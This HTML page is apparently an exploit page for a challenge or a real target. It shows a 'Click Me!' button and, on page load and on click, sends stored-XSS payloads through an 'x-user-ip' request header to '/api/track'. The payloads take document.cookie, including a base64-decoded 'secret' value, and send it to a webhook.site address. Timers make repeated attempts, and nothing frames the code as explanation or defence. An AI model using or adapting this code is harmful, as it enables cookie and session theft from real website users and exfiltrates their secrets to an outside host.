<!DOCTYPE html>
<html>
<head>
    <title>Click Me</title>
    <style>
        .center-button {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #4CAF50;
            color: white;
            padding: 20px 40px;
            font-size: 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <button id="button" class="center-button">Click Me!</button>

    <script>
        // Run when page loads
        window.onload = function() {
            // The initial payload - extremely simple
            sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c="+document.cookie`);
            
            // Position button perfectly at center
            const centerButton = document.createElement('button');
            centerButton.textContent = 'Click Me!';
            centerButton.className = 'center-button';
            
            // When clicked, send another exploit
            centerButton.addEventListener('click', function() {
                // Second payload triggered by click
                sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=click&c="+document.cookie`);
                
                // After a few seconds, try to decode the secret
                setTimeout(function() {
                    // Super minimal decode payload
                    sendExploit(`
                    var s=document.cookie.split("secret=")[1]?.split(";")[0];
                    var d;try{d=atob(s)}catch(e){d=""}
                    new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?s="+s+"&d="+d;
                    `);
                }, 2000);
                
                // Schedule more payloads during the 60-second wait period
                setTimeout(function() {
                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=10&c="+document.cookie`);
                }, 10000);
                
                setTimeout(function() {
                    sendExploit(`new Image().src="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?t=30&c="+document.cookie`);
                }, 30000);
            });
            
            // Replace the original button with our perfect center button
            document.body.innerHTML = '';
            document.body.appendChild(centerButton);
        };
        
        // Function to send an XSS exploit via x-user-ip header
        function sendExploit(code) {
            // Create a hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // When it loads, send the exploit
            iframe.onload = function() {
                try {
                    fetch('/api/track', {
                        headers: {
                            'x-user-ip': code
                        }
                    });
                } catch(e) {
                    console.error('Error sending exploit:', e);
                }
            };
            
            // Set source to trigger load
            iframe.src = 'about:blank';
        }
    </script>
</body>
</html>
